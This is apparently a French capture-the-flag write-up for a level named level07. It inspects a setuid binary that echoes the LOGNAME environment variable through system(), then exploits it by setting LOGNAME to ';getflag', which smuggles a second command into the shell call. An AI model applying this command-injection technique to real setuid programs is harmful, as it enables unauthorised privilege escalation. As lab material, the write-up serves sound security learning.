# Level07

Premiere étape de recherche

	$ ls -la
	-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07

On trouve un binaire avec setuid et setgid

	$ ./level07
	level07

Il affiche son nom

	$ strings level07
	...
	system
	...
	/bin/echo %s
	....

Il utilise system et affiche avec le binaire echo %s

Analysons le avec GDB. Avec un disas main, on voit qu'il utilise asprintf, surement pour completer une chaine avec le echo et la passer a system. Il fait aussi un getenv, pour trouver "level07"?

	$ env | grep level07
	USER=level07
	MAIL=/var/mail/level07
	PWD=/home/user/level07
	HOME=/home/user/level07
	LOGNAME=level07

Si on modifie la variable d'environnement LOGNAME...

	$ export LOGNAME=coucou
	$ ./level07
	coucou

Il utilise cette variable. On va y injecter une autre commande

	$ export LOGNAME=';getflag'
	$ ./level07
	Check flag.Here is your token : XXXXXXXXXXXXXXXX
